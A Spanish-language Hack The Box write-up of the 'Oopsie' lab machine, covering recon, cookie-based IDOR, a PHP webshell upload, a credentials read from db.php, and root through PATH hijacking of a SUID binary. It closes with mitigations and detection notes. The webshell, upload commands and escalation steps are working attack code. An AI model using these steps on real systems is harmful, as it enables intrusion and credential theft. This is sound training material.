---
machine: Oopsie
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [web, idor, upload, suid, tier2]
---

# Oopsie — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available · Starting Point · Tier 2 · Linux · Very Easy

## TL;DR

Login de invitado con **IDOR en cookies** (`role=admin`, `id=1`) que da acceso al panel. Desde ahí se sube un webshell, se leen las credenciales de `robert` en el código y se escala con un **SUID `bugtracker`** que llama a `cat` sin ruta absoluta (PATH hijacking).

---

## Reconocimiento

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
22/tcp open ssh  OpenSSH 7.6p1 Ubuntu
80/tcp open http Apache httpd 2.4.29 (Ubuntu)
```

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php
```

```text
/cdn-cgi/login/    (200)
/uploads/          (403)
/assets
```

## Enumeración

En `/cdn-cgi/login/` se puede entrar como invitado. Las cookies de sesión son:

```text
user=2233
role=guest
```

Se modifican a mano: `role=admin` y `user=1`. El panel responde con la vista de administrador y un formulario de subida.

## Foothold

```bash
cat > shell.php <<'PHP'
<?php system($_GET['c']); ?>
PHP
curl -s -b 'user=1; role=admin' -F 'file=@shell.php' http://<TARGET_IP>/uploads/
curl -s "http://<TARGET_IP>/uploads/shell.php?c=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Movimiento lateral

El código del login incluye las credenciales de la base y de un usuario del sistema:

```bash
curl -s "http://<TARGET_IP>/uploads/shell.php?c=cat+/var/www/html/cdn-cgi/login/db.php"
```

```bash
ssh robert@<TARGET_IP>
```

## Escalada de privilegios

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/bugtracker
```

`bugtracker` ejecuta `cat` sin ruta absoluta. Se crea un `cat` malicioso en un directorio escribible y se antepone al `PATH`:

```bash
cd /tmp
printf '#!/bin/sh\n/bin/sh\n' > cat
chmod +x cat
PATH=/tmp:$PATH /usr/bin/bugtracker
```

```text
# id
uid=0(root)
```

## Evidencia

- Cookies manipuladas y panel de administrador.
- `find` con el SUID y shell de root.

## Lecciones aprendidas

- El control de acceso en el cliente (cookies) es una invitación al IDOR.
- Un formulario de subida sin validación de tipo ni de ejecución es RCE directo.
- El código fuente accesible desde la web filtra credenciales de sistema.
- Un binario SUID que llama a otro sin ruta absoluta se secuestra con `PATH`.

## Mitigaciones y detección

- Autorización en servidor: el rol nunca viaja en una cookie editable.
- Subidas fuera del document root, renombradas y sin permisos de ejecución.
- Secretos en variables de entorno o gestor, no en `db.php`.
- SUID mínimo; binarios con rutas absolutas y `PATH` limpio.
- Detección: cookies con `role=admin` desde sesiones de invitado, `.php` en `/uploads/`, ejecución de `bugtracker` con `PATH` alterado.

- CWE-639 (IDOR), CWE-434, CWE-426
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1505.003](https://attack.mitre.org/techniques/T1505/003/), [T1574.007 Path Interception by PATH Environment Variable](https://attack.mitre.org/techniques/T1574/007/)

## Referencias

- [OWASP — IDOR](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control)
- [HackTricks — SUID / PATH](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
